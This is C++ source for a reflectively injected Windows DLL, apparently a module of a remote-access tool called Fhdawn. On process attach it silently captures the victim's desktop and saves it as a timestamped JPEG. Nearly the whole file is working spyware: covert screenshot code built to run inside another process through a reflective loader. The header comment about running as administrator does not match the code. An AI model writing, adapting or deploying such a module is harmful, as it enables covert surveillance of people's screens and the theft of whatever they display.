//===============================================================================================//
// This DLL will execute Fhdawn as administrator
//===============================================================================================//

#include "ReflectiveLoader.h"
#include <gdiplus.h>
#include <ctime>
#include <string>
void TakeScreenshot()
{
    char buffer[100] = {0};
	memset(buffer, '\0', 100);
	time_t t = time(0); 
	struct tm * now = localtime( & t );
	memset(buffer, '\0', 100);
	strftime (buffer,100,"%Y-%m-%d-%S.jpg",now);    
	std::string x(buffer);
    ScreenShot(x);
}

void ScreenShot(std::string JPEG_FILENAME)
{
    ULONG_PTR gdiplustoken;
	Gdiplus::GdiplusStartupInput gdistartupinput;
	Gdiplus::GdiplusStartupOutput gdistartupoutput;

	gdistartupinput.SuppressBackgroundThread = true;
	GdiplusStartup(& gdiplustoken,& gdistartupinput,& gdistartupoutput); //start GDI+

	HDC dc=GetDC(GetDesktopWindow());
	HDC dc2 = CreateCompatibleDC(dc);

	RECT rc0kno;

	GetClientRect(GetDesktopWindow(),&rc0kno);
	int w = rc0kno.right-rc0kno.left;
	int h = rc0kno.bottom-rc0kno.top;

	HBITMAP hbitmap = CreateCompatibleBitmap(dc,w,h);
	HBITMAP holdbitmap = (HBITMAP) SelectObject(dc2,hbitmap);

	BitBlt(dc2, 0, 0, w, h, dc, 0, 0, SRCCOPY);
	Gdiplus::Bitmap* bm= new Gdiplus::Bitmap(hbitmap,NULL);

	UINT num;
	UINT size;

	Gdiplus::ImageCodecInfo *imagecodecinfo;
	Gdiplus::GetImageEncodersSize(&num,&size);

	imagecodecinfo = (Gdiplus::ImageCodecInfo*)(malloc(size));
	Gdiplus::GetImageEncoders (num,size,imagecodecinfo);

	CLSID clsidEncoder;

	for(int i=0; i < num; i++)
	{
		if(wcscmp(imagecodecinfo[i].MimeType,L"image/jpeg")==0)
			clsidEncoder = imagecodecinfo[i].Clsid;

	}

	free(imagecodecinfo);

	std::wstring ws;
	ws.assign(JPEG_FILENAME.begin(),JPEG_FILENAME.end());
	bm->Save(ws.c_str(),& clsidEncoder, NULL); 
	SelectObject(dc2,holdbitmap);
	DeleteObject(dc2);
	DeleteObject(hbitmap);

	ReleaseDC(GetDesktopWindow(),dc);
	Gdiplus::GdiplusShutdown(gdiplustoken);
}


extern HINSTANCE hAppInstance;
//===============================================================================================//
BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
{
    BOOL bReturnValue = TRUE;
	switch( dwReason ) 
    { 
		case DLL_QUERY_HMODULE:
			if( lpReserved != NULL )
				*(HMODULE *)lpReserved = hAppInstance;
			break;
		case DLL_PROCESS_ATTACH:
			hAppInstance = hinstDLL;
			TakeScreenshot();
			break;
		case DLL_PROCESS_DETACH:
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
            break;
    }
	return bReturnValue;
}